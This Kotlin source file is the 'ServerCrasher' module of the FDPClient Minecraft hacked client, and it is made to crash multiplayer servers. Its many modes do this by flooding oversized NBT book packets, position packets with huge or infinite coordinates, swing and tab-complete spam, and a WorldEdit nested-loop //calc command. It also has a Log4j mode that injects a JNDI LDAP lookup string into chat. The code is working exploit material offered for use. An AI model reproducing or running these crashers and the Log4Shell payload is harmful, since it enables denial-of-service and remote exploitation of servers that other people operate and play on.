/*
 * FDPClient Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge by LiquidBounce.
 * https://github.com/SkidderMC/FDPClient/
 */
package net.ccbluex.liquidbounce.features.module.modules.exploit

import io.netty.buffer.Unpooled
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import net.ccbluex.liquidbounce.event.*
import net.ccbluex.liquidbounce.features.module.Category
import net.ccbluex.liquidbounce.features.module.Module
import net.ccbluex.liquidbounce.script.api.global.Chat
import net.ccbluex.liquidbounce.utils.PacketUtils.sendPacket
import net.ccbluex.liquidbounce.utils.extensions.SharedScopes
import net.ccbluex.liquidbounce.utils.extensions.component1
import net.ccbluex.liquidbounce.utils.extensions.component2
import net.ccbluex.liquidbounce.utils.extensions.component3
import net.ccbluex.liquidbounce.utils.misc.RandomUtils.nextInt
import net.ccbluex.liquidbounce.utils.misc.RandomUtils.randomNumber
import net.ccbluex.liquidbounce.utils.misc.RandomUtils.randomString
import net.ccbluex.liquidbounce.utils.timing.MSTimer
import net.ccbluex.liquidbounce.value.boolean
import net.ccbluex.liquidbounce.value.choices
import net.minecraft.init.Items
import net.minecraft.item.ItemStack
import net.minecraft.nbt.NBTTagCompound
import net.minecraft.nbt.NBTTagList
import net.minecraft.nbt.NBTTagString
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.*
import net.minecraft.network.play.client.C03PacketPlayer.C04PacketPlayerPosition
import net.minecraft.network.play.server.S2DPacketOpenWindow
import net.minecraft.network.play.server.S2EPacketCloseWindow
import net.minecraft.network.play.server.S2FPacketSetSlot
import net.minecraft.util.BlockPos
import kotlin.random.Random.Default.nextBoolean

object ServerCrasher : Module("ServerCrasher", Category.EXPLOIT) {

    private val mode by choices(
        "Mode", arrayOf(
            "Book",
            "Swing",
            "MassiveChunkLoading",
            "WorldEdit",
            "Pex",
            "CubeCraft",
            "AACNew", "AACOther", "AACOld",
            "BSign", "BEdit",
            "Netty", "Netty2",
            "MultiverseCore",
            "CommandComplete",
            "Inventory",
            "Log4j"
        ), "Log4j"
    )

    private val log4jModeValue by choices("Log4JMode", arrayOf("RawChat", "Chat", "Command"), "Chat") { mode == "Log4j" }
    private val slientInventoryValue by boolean("SlientInventory", false) { mode == "Inventory" }

    private val pexTimer = MSTimer()
    private var nowInv = -1
    private val invSlots = mutableMapOf<Int, ItemStack>()

    private val bookForNetty: ItemStack by lazy {
        val size = ".".repeat(1953)
        val book = ItemStack(Items.writable_book)
        val tag = NBTTagCompound()
        val list = NBTTagList()
        repeat(340) {
            list.appendTag(NBTTagString(size))
        }
        tag.setString("author", "Netty$size")
        tag.setString("title", size)
        tag.setTag("pages", list)
        book.tagCompound?.setTag("pages", list) ?: book.setTagInfo("pages", list)

        book
    }

    private val packetBufferForNBT: PacketBuffer by lazy {
        val tag = NBTTagCompound()
        val list = NBTTagList()
        val string = buildString(14458) {
            append('{')
            repeat(850) { append("extra:[{") }
            repeat(850) { append("text:a}],") }
            append("text:a}")
        }

        repeat(2) {
            list.appendTag(NBTTagString(string))
        }

        tag.setString("author", randomString(20))
        tag.setString("title", randomString(20))
        tag.setInteger("resolved", 1)
        tag.setTag("pages", list)
        val book = ItemStack(Items.writable_book)
        book.tagCompound = tag

        PacketBuffer(Unpooled.buffer()).apply { writeItemStackToBuffer(book) }
    }

    override fun onEnable() {
        val thePlayer = mc.thePlayer ?: return

        when (mode.lowercase()) {
            "aacnew" -> {
                // Spam positions
                repeat(10000) {
                    sendPacket(
                        C04PacketPlayerPosition(
                            thePlayer.posX + 9412 * it,
                            thePlayer.entityBoundingBox.minY + 9412 * it,
                            thePlayer.posZ + 9412 * it,
                            true
                        )
                    )
                }
            }

            "aacother" -> {
                // Spam positions
                repeat(10000) {
                    sendPacket(
                        C04PacketPlayerPosition(
                            thePlayer.posX + 500000 * it,
                            thePlayer.entityBoundingBox.minY + 500000 * it,
                            thePlayer.posZ + 500000 * it,
                            true
                        )
                    )
                }
            }

            "aacold" -> {
                // Send negative infinity position
                sendPacket(
                    C04PacketPlayerPosition(
                        Double.NEGATIVE_INFINITY,
                        Double.NEGATIVE_INFINITY,
                        Double.NEGATIVE_INFINITY,
                        true
                    )
                )
            }

            "worldedit" -> {
                // Send crash command
                thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}")
            }

            "cubecraft" -> {
                // Not really needed but doesn't matter
                thePlayer.setPosition(thePlayer.posX, thePlayer.posY + 0.3, thePlayer.posZ)
            }

            "massivechunkloading" -> {
                // Fly up into sky
                var yPos = thePlayer.posY
                while (yPos < 255) {
                    sendPacket(C04PacketPlayerPosition(thePlayer.posX, yPos, thePlayer.posZ, true))
                    yPos += 5.0
                }

                // Fly over world
                var i = 0
                while (i < 1337 * 5) {
                    sendPacket(C04PacketPlayerPosition(thePlayer.posX + i, 255.0, thePlayer.posZ + i, true))
                    i += 5
                }
            }

            "bsign" -> {
                sendPacket(C17PacketCustomPayload("MC|BSign", packetBufferForNBT))
            }

            "bedit" -> {
                sendPacket(C17PacketCustomPayload("MC|BEdit", packetBufferForNBT))
            }

            "netty" -> {
                sendPacket(C08PacketPlayerBlockPlacement(BlockPos(mc.thePlayer).down(2), 1, bookForNetty, 0f, 0f, 0f))
            }

            "netty2" -> {
                SharedScopes.IO.launch {
                    while (mc.netHandler.networkManager.isChannelOpen) {
                        sendPacket(C10PacketCreativeInventoryAction(100, bookForNetty))
                        delay(10L)
                    }
                }
            }
            "log4j" -> {
                val str = "\${jndi:ldap://192.168.${nextInt(1,253)}.${nextInt(1,253)}}"
                mc.netHandler.addToSendQueue(
                    C01PacketChatMessage(when(log4jModeValue.lowercase()) {
                        "chat" -> "${randomString(5)}$str${randomString(5)}"
                        "command" -> "/tell ${randomString(10)} $str"
                        else -> str
                    })
                )
            }
        }
    }

    @EventTarget
    fun onMotion(event: MotionEvent) {
        val thePlayer = mc.thePlayer

        if (event.eventState == EventState.POST || thePlayer == null)
            return

        when (mode.lowercase()) {
            "book" -> {
                val bookStack = ItemStack(Items.writable_book)
                val bookCompound = NBTTagCompound()

                bookCompound.setString("author", randomNumber(20))
                bookCompound.setString("title", randomNumber(20))

                val pageList = NBTTagList()
                val pageText = randomNumber(600)


                repeat(50) {
                    pageList.appendTag(NBTTagString(pageText))
                }

                bookCompound.setTag("pages", pageList)
                bookStack.tagCompound = bookCompound

                repeat(100) {
                    val packetBuffer = PacketBuffer(Unpooled.buffer())
                    packetBuffer.writeItemStackToBuffer(bookStack)
                    sendPacket(C17PacketCustomPayload(if (nextBoolean()) "MC|BSign" else "MC|BEdit", packetBuffer))
                }
            }

            "cubecraft" -> {
                val (x, y, z) = thePlayer

                repeat(3000) {
                    sendPacket(C04PacketPlayerPosition(x, y + 0.09999999999999, z, false))
                    sendPacket(C04PacketPlayerPosition(x, y, z, true))
                }
                thePlayer.motionY = 0.0
            }

            "pex" -> if (pexTimer.hasTimePassed(2000)) {
                // Send crash command
                thePlayer.sendChatMessage(if (nextBoolean()) "/pex promote a a" else "/pex demote a a")
                pexTimer.reset()
            }

            "swing" -> {
                repeat(5000) {
                    sendPacket(C0APacketAnimation())
                }
            }

            "commandcomplete" -> {
                repeat(500) {
                    sendPacket(C14PacketTabComplete("/${randomString(100)}"))
                }
            }

            else -> state = false // Disable module when mode is just a one run crasher
        }
    }

    @EventTarget
    fun onPacket(event: PacketEvent) {
        val packet = event.packet

        when (mode.lowercase()) {
            "inventory" -> {
                if(packet is S2DPacketOpenWindow) {
                    nowInv = packet.windowId
                    if (slientInventoryValue) {
                        Chat.print("Inventory opened, sending packets...")
                        event.cancelEvent()
                    }
                } else if (packet is S2EPacketCloseWindow || packet is C0DPacketCloseWindow) {
                    nowInv = -1
                    invSlots.clear()
                } else if (packet is S2FPacketSetSlot) {
                    if (packet.func_149175_c() == nowInv && packet.func_149174_e() != null && !invSlots.containsKey(packet.func_149173_d())) {
                        invSlots[packet.func_149173_d()] = packet.func_149174_e()
                    }
                }
            }
        }
    }

    @EventTarget
    fun onWorld(event: WorldEvent) {
        if (event.worldClient == null)
            state = false // Disable module in case you left the server
    }

    @EventTarget
    fun onTick(event: GameTickEvent) {
        if (mc.thePlayer == null || mc.theWorld == null)
            state = false // Disable module in case you left the server
    }

    override val tag
        get() = mode
}